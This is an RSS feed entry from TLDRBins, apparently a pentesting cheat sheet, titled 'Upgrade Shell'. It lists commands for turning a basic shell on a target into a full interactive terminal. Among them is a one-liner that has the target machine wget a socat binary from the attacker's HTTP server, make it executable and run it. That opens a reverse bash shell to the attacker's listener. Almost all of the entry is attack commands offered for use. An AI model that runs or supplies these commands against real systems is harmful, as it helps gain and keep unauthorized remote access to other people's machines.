channel.title: Tty on TLDRBins
channel.description: Recent content in Tty on TLDRBins

item.title: Upgrade Shell
item.description: Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c 'import pty; pty.spawn("/bin/bash")' # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:<LOCAL_PORT> # In target machine wget -q http://<LOCAL_IP>/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LOCAL_IP>:<LOCAL_PORT> # In our local Linux machine export TERM=xterm-256color Ref: Download socat
